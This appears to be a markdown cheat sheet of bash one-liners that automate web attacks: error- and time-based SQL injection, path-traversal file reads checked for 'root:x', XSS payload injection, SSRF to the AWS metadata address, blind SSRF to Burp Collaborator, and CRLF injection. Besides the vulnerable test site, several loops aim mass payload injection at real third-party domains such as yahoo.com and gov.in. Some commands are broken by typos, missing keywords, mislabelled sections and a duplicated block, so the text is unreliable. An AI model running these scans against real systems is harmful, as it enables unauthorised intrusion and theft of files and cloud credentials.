# WEBAPPLICATION-ATTACKS-SCRIPT

AUTOMATE WEB APPLICATION ATTACKS WITH SCRIPTS

**Error based sqli**

Target: http://TARGET.com/artists.php?artist=1

**Command:**
curl -sk "http://testphp.vulnweb.com/artists.php?artist=1" | grep -q "WHAT KIND for error for sql injection"

**Automation:**
gau -subs testphp.vulnweb.com | gf sqli | httpx | qsreplace "1'" | xargs -I{} sh -c 'curl -sk "{}" 2>&1 | grep -q "mysql_fetch_array" && echo " $(tput setaf 1)SQLI VULNERABLE $(tput setaf 3) %"'
gau -subs testphp.vulnweb.com | grep "=" | httpx -silent | qsreplace "1'" | xargs -I{} sh -c 'curl -sk "{}" 2>&1 | grep -q "mysql_fetch_array" && echo " $(tput setaf 1)SQLI VULNERABLE $(tput setaf 3) {}"' 

**FULL automation:**
for sqli $(cat sqliyaload.txt) ;do for url in $(gau -subs targets.txt | grep "=" | gf sqli | httpx | qsrepalce "$sqli") ;do echo "$url" | xargs -I{} sh -c 'curl -sk "{}" 2>&1 | grep -q "mysql_fetch_array" && echo "Error based SQLI {}"' ;done 


**Time based:**
payload used: ' or sleep(5)#

Normal testing:
time curl -s -I "http://testphp.vulnweb.com/artists.php?artist=1"
time curl -s -I "http://testphp.vulnweb.com/artists.php?artist=1 or sleep(10)#" 
 
 
**Automation:**
for sqli in $(cat sqlitime.txt) ;do for url in $(gau -subs yahoo.com) ;do  echo "$url" | qsreplace "$sqli"| parallel -j 10 'time curl -s -I "%"' ;print "timebase sqli without payload" ;echo "$url" | parallel -j 10 'time curl -s -I "%"' ;done ;done


**LFI:**

cat /payloads/pathtravers.txt | parallel -j 6 'curl -sk "http://testphp.vulnweb.com/showimage.php?file={}" 2>&1 | grep -q "root:x" && echo "VULN! LFI {}"'

for lfi in $(cat /payloads/pathtravers.txt ); do for  url  in $(gau -subs yahoo.com | gf lfi | qsreplace "$lfi"); do echo "urls" | parallel  -j 10 'curl -s "{}" 2>&1 | grep -q "root:x" && echo "LFI VULN! {}"' ; done ; done


**XSS:**

grep "?" | sort -u |  grep "=" | qsreplace "<img src=x onerror=alert(1)>" | xargs -I % sh -c 'curl -sk "%"   2>&1 | grep -q "alert(1)" --color && echo " $(tput setaf 1)XSS VULNERABLE $(tput setaf 3) %"'  --> automation

cat testparam.txt | parallel -j 5  echo "https://xss-game.appspot.com/level1/frame?{}" | qsreplace "<img src=x onerror=alert(1)>" | xargs -I % sh -c 'curl -sk "%"   2>&1 | grep -q "alert(1)" --color && echo " $(tput setaf 2)XSS VUL $(tput setaf 1 setab 7) %"'

for xss in $(cat /payloads/xss.txt ); do for  url  in $(gau -subs yahoo.com | gf lfi | qsreplace "$xss"); do echo "urls" | parallel  -j 10 'curl -s "{}" 2>&1 | grep -q "aler(1)" && echo "LFI VULN! {}"' ; done ; done

**SSRF:**
gau -subs testphp.vulnweb.com | grep "=" | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I% sh -c 'curl -sk "%" 2>&1 | grep "compute.internal" && echo " ssrf aws metadata %"'

**BLIND ssrf:**

gau -subs testphp.vulnweb.com | gf ssrf | qsreplace "http://burpcollaborator.net" | httpx -silent -proxy http://127.0.0.1:8080

subfinder -d yahoo.com -silent | httpx -silent -proxy http://127.0.0.1:8080 -H "Referer: http://burpcollaborator.net"




Command:

curl -sk "http://testphp.vulnweb.com/showimage.php?file=http://burpcollab.net" |httpx

**Automation:**
gau -subs testphp.vulnweb.com | grep "=" | httpx -silent | qsreplace "http://burpcollab.net" | xargs -I{} sh -c 'curl -sk "{}"

**FULL automation:**
for burpcoll $(cat burppayaload.txt) ;do for url in $(gau -subs targets.txt | grep "=" | gf ssrf | httpx | qsrepalce "$burpcoll") ;do echo "$url" | httpx -silent  ;done 

gau -subs gov.in | grep "=" | gf ssrf | httpx -silent | qsreplace "http://burpcollab.net" | parallel -j 30 curl -sk "{}"

**Blind SSRF by header:**
Target:
testphp.vulnweb.com

Command:
**FUll Automation:**
subfinder -d testphp.vulnweb.com -silent | httpx -H "Referer: http://burpcollab.net" 

**SSRF to access metadata**
Automation;
gau -subs testphp.vulnweb.com | grep "=" | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I% sh -c 'curl -sk "%" 2>&1 | grep "compute.internal" && echo " ssrf aws metadata %"'

**CRLF**
for crlf in $(cat crlfpayload.txt); do for url in $(gautest.com | grep "=" | qsreplace "$crlf"); do echo $url| xargs -I@ sh -c 'curl -sk -I "@" 2>&1 | grep -q "Set-Cookie:%20test=test" && echo "CRLF VUL @"' ;done ;done

**AUTOMATE BROKEN LINK HIJACKING****

INSTALL blc

subfinder -dL -silent | httpx -silent | parllel -j 10 blc {} | grep "broken"

for crlf in $(cat crlfpayload.txt); do for url in $(gautest.com | grep "=" | qsreplace "$crlf"); do echo $url| xargs -I@ sh -c 'curl -sk -I "@" 2>&1 | grep -q "Set-Cookie:%20test=test" && echo "CRLF VUL @"' ;done ;done



